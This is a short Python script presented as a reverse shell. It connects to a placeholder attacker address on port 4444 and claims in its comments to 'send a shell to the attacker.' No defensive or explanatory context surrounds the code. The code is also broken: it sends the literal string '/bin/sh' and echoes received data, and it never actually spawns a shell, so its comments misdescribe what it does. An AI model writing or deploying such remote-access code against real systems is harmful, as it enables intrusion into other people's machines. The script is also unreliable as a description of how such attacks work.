import socket

# Target IP address and port
target_ip = "attacker_ip_address" 
target_port = 4444 

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

# Connect to the attacker's system
s.connect((target_ip, target_port)) 

# Send a shell to the attacker
s.sendall(b"/bin/sh\x00") 

# Receive and send data
while True:
    data = s.recv(1024)
    if data == b"":
        break
    s.sendall(data)

